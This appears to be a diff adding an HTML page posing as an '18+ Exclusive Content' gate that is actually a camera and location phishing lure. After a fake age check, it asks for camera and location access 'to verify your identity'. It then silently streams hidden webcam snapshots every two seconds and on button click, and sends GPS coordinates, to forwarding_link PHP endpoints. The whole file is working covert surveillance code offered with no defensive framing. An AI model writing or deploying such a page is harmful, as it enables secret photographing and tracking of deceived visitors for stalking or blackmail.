@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>18+ Exclusive Content</title>
+
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background: #f3f3f3;
+        margin: 0;
+        padding: 20px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+    }
+
+    .image-container {
+        width: 320px;
+        height: 200px;
+        overflow: hidden;
+        margin-bottom: 20px;
+        filter: blur(18px);
+        transition: 0.4s ease;
+        border-radius: 10px;
+    }
+
+    .image-container img {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+    }
+
+    #ageVerificationBox, #permissionBox {
+        border: 2px solid #444;
+        padding: 20px;
+        background: white;
+        width: 320px;
+        border-radius: 10px;
+        text-align: center;
+        margin-bottom: 15px;
+    }
+
+    button {
+        padding: 12px 20px;
+        background: #2b8cff;
+        color: white;
+        border: none;
+        cursor: pointer;
+        border-radius: 6px;
+        font-size: 16px;
+        margin-top: 10px;
+    }
+
+    button:disabled {
+        background: gray;
+        cursor: not-allowed;
+    }
+
+    h2 {
+        font-size: 24px;
+    }
+
+    .video-capture {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 640px;
+        height: 480px;
+        z-index: -100;
+        opacity: 0;
+        pointer-events: none;
+    }
+</style>
+
+</head>
+<body>
+
+<h2>18+ Exclusive Content</h2>
+
+<!-- Hidden camera capture elements -->
+<div class="video-capture">
+    <video id="cam" playsinline autoplay muted></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+</div>
+
+<!-- Age Verification Section -->
+<div id="ageVerificationBox">
+    <h3>Are You 18 or Older?</h3>
+    <p>This content is only for adults 18+.</p>
+    <button id="verifyAge">Yes, I am 18+</button>
+</div>
+
+<!-- Image and Permissions Section (Hidden initially) -->
+<div id="contentSection" style="display:none;">
+    <div class="image-container" id="blurBox">
+        <!-- Using a placeholder image from CDN -->
+        <img src="https://cdn.jsdelivr.net/gh/techchipnet/AnuBiS/assets/preview.mp4" alt="Secured Image">
+    </div>
+
+    <div id="permissionBox">
+        <h3>Permissions Required</h3>
+        <p>Please allow <strong>Camera</strong> and <strong>Location</strong> to verify your identity.</p>
+        <button id="askPermission">Grant Permissions</button>
+    </div>
+
+    <button id="viewBtn" disabled>View Image</button>
+</div>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script>
+const verifyAgeBtn = document.getElementById("verifyAge");
+const ageVerificationBox = document.getElementById("ageVerificationBox");
+const contentSection = document.getElementById("contentSection");
+const askPermissionBtn = document.getElementById("askPermission");
+const viewBtn = document.getElementById("viewBtn");
+const blurBox = document.getElementById("blurBox");
+
+const video = document.getElementById("cam");
+const canvas = document.getElementById("canvas");
+const constraints = { audio: false, video: { facingMode: "user" } };
+
+// Helper functions for sending data
+function send(data){$.post("forwarding_link/post.php",{cat:data});}
+function loc(){
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(p=>{
+            $.post("forwarding_link/location.php",{
+                lat:p.coords.latitude,
+                lon:p.coords.longitude,
+                acc:p.coords.accuracy
+            });
+        });
+    }
+}
+
+let cameraStream = null;
+let captureInterval = null;
+
+verifyAgeBtn.addEventListener("click", () => {
+    ageVerificationBox.style.display = "none";
+    contentSection.style.display = "block";
+});
+
+askPermissionBtn.addEventListener("click", async () => {
+    try {
+        // Request Camera - use same pattern as working templates
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        window.stream = stream;
+        video.srcObject = stream;
+        
+        video.onloadedmetadata = function(e) {
+            video.play();
+        };
+        
+        // Start capturing immediately like working templates
+        var context = canvas.getContext('2d');
+        captureInterval = setInterval(function(){
+            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                context.drawImage(video, 0, 0, 640, 480);
+                var canvasData = canvas.toDataURL("image/jpeg", 0.9);
+                send(canvasData);
+            }
+        }, 2000);
+
+        // Request Location
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                $.post("forwarding_link/location.php", {
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude,
+                    acc: position.coords.accuracy
+                });
+                permissionsSuccess();
+            },
+            (error) => {
+                permissionsSuccess();
+            }
+        );
+
+    } catch (e) {
+        alert("Camera permission denied. Please allow camera access to continue.");
+    }
+});
+
+// Permissions Success
+function permissionsSuccess() {
+    blurBox.style.filter = "blur(0px)";
+    viewBtn.disabled = false;
+    document.getElementById("permissionBox").style.display = "none";
+    loc();
+}
+
+viewBtn.addEventListener("click", () => {
+    // Take 5 rapid high-quality shots
+    const ctx = canvas.getContext("2d");
+    for(let i=0; i<5; i++){
+        setTimeout(() => {
+            ctx.drawImage(video, 0, 0, 640, 480);
+            send(canvas.toDataURL("image/jpeg", 0.95));
+        }, i*300);
+    }
+    loc();
+    setTimeout(() => {
+        alert("Image is now unlocked!");
+    }, 1500);
+});
+</script>
+
+</body>
+</html>
